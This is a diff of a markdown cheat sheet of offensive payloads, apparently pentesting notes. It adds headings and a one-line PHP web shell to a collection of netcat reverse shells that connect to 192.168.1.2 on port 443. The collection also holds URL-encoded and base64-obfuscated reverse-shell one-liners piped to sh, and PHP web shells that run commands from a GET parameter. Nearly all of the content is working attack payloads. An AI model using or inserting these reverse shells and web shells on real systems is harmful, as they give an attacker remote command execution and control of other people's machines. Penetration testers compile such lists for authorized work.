@@ -97,14 +97,20 @@
   
   # <kbd>Netcat Linux</kbd>
 
+  # <kbd>-e</kbd>
+  
   ```cmd
   nc -e /bin/sh 192.168.1.2 443
 
   nc -e /bin/bash 192.168.1.2 443
-
+  
+  # <kbd>-c</kbd>
+  
   nc -c /bin/sh 192.168.1.2 443
   
   nc -c /bin/bash 192.168.1.2 443
+  
+  # <kbd>fifo</kbd>
   
   rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.2 443 >/tmp/f
   ```
@@ -126,6 +132,7 @@
   ```cmd
   nc%20-e%20%2Fbin%2Fsh%20192.168.1.2%20443
   ```
+  
   ```cmd
   rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20192.168.1.2%20443%20%3E%2Ftmp%2Ff
   ```
@@ -133,7 +140,7 @@
   # <kbd>Netcat Base64 Encoding</kbd>
  
   ```cmd
-  echo "cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTkyLjE2OC4xLjE4IDQ0MyA+L3RtcC9mCg==" | base64 -d | sh
+  echo 'cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTkyLjE2OC4xLjE4IDQ0MyA+L3RtcC9mCg==' |base64 -d |sh
   ```
  
   ---
@@ -182,7 +189,11 @@
   # <kbd>PHP WebShell</kbd>
   
   # <kbd>Basic</kbd>
-   
+  
+  ```php
+  <?=`$_GET[cmd]`?>
+  ```
+  
   ```php
   <?php system($_GET['cmd']); ?>
   ```
